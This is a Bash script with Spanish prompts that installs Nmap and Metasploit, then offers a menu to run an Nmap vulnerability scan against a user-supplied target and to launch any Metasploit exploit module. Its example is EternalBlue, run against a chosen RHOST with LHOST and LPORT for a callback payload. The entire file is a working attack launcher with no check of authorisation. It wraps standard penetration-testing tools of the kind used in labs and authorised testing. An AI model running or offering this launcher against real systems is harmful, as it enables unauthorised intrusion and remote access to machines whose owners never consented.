#!/bin/bash

# Verificar si Nmap está instalado
if ! command -v nmap &> /dev/null; then
    echo "Hola, soy Osvaldo. Parece que Nmap no está instalado. Instalándolo por ti..."
    sudo apt-get update && sudo apt-get install -y nmap
fi

# Verificar si Metasploit está instalado
if ! command -v msfconsole &> /dev/null; then
    echo "Hola, soy Osvaldo. Parece que Metasploit no está instalado. Instalándolo por ti..."
    sudo apt-get update && sudo apt-get install -y metasploit-framework
fi

# Función para realizar escaneo de vulnerabilidades con Nmap
vuln_scan() {
    echo -n "Soy Osvaldo. Ingresa la IP o dominio a escanear: "
    read -r target
    echo "Realizando un escaneo de vulnerabilidades en $target con Nmap..."
    nmap --script vuln -oN nmap_vuln_results.txt "$target"
    echo "Escaneo completado. Los resultados se guardaron en 'nmap_vuln_results.txt'."
}

# Función para explotar vulnerabilidades con Metasploit
exploit_vuln() {
    echo -n "Soy Osvaldo. Ingresa el exploit que deseas usar (ejemplo: exploit/windows/smb/ms17_010_eternalblue): "
    read -r exploit
    echo -n "Ingresa el RHOST (IP de la máquina objetivo): "
    read -r rhost
    echo -n "Ingresa el LHOST (tu IP para el payload): "
    read -r lhost
    echo -n "Ingresa el LPORT (puerto para el payload): "
    read -r lport
    echo "Lanzando Metasploit para explotar $exploit..."
    msfconsole -q -x "use $exploit; set RHOSTS $rhost; set LHOST $lhost; set LPORT $lport; run"
}
 
# Función para mostrar el menú
show_menu() {
    echo "========================="
    echo "   Script de Osvaldo"
    echo "========================="
    echo "1. Escanear vulnerabilidades con Nmap"
echo "2. Explotar vulnerabilidades con Metasploit"
    echo "3. Salir"
    echo "========================="
    echo -n "Selecciona una opción: "
}
 
# Bucle principal
while true; do
    show_menu
    read -r option
    case $option in
        1)
            vuln_scan
            ;;
        2)
            exploit_vuln
            ;;
        3)
            echo "Soy Osvaldo. ¡Hasta luego y ten cuidado!"
            exit 0
            ;;
*)
            echo "Opción inválida. Inténtalo de nuevo."
            ;;
    esac
done
